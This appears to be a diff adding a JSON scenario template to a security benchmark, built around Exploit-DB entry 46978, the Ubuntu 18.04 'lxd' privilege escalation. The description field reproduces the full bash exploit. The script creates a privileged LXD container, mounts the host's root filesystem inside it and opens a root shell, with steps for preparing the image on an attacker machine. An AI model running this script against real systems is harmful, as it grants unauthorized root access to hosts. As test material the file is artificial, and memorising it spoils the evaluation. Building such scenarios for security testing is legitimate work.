@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_46978",
+  "category": "E1_docker_escape",
+  "attack_technique": "T1611",
+  "cwe": "CWE-268",
+  "description": "Linux privilege escalation: Ubuntu 18.04 - 'lxd' Privilege Escalation\n\nExploit source code (46978.sh):\n```\n#!/usr/bin/env bash\n\n# ----------------------------------\n# Authors: Marcelo Vazquez (S4vitar)\n#\t   Victor Lasa      (vowkin)\n# ----------------------------------\n\n# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]\n# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]\n# Step 3: Run this script and you will get root [Victim Machine]\n# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine\n\nfunction helpPanel(){\n  echo -e \"\\nUsage:\"\n  echo -e \"\\t[-f] Filename (.tar.gz alpine file)\"\n  echo -e \"\\t[-h] Show this help panel\\n\"\n  exit 1\n}\n\nfunction createContainer(){\n  lxc image import $filename --alias alpine && lxd init --auto\n  echo -e \"[*] Listing images...\\n\" && lxc image list\n  lxc init alpine privesc -c security.privileged=true\n  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true\n  lxc start privesc\n  lxc exec privesc sh\n  cleanup\n}\n\nfunction cleanup(){\n  echo -en \"\\n[*] Removing container...\"\n  lxc stop privesc && lxc delete privesc && lxc image delete alpine\n  echo \" [√]\"\n}\n\nset -o nounset\nset -o errexit\n\ndeclare -i parameter_enable=0; while getopts \":f:h:\" arg; do\n  case $arg in\n    f) filename=$OPTARG && let parameter_enable+=1;;\n    h) helpPanel;;\n  esac\ndone\n\nif [ $parameter_enable -ne 1 ]; then\n  helpPanel\nelse\n  createContainer\nfi\n```",
+  "cve": "",
+  "exploitdb_id": "46978",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_46978",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
